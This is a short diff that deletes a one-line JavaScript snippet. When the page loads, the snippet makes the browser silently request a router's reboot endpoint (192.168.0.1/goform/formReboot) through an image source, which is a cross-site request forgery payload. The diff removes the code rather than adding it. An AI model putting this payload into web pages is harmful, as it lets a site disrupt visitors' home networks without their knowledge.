@@ -1,1 +1,0 @@
-(function(){\n    (new Image()).src = "http://192.168.0.1/goform/formReboot";\n})();
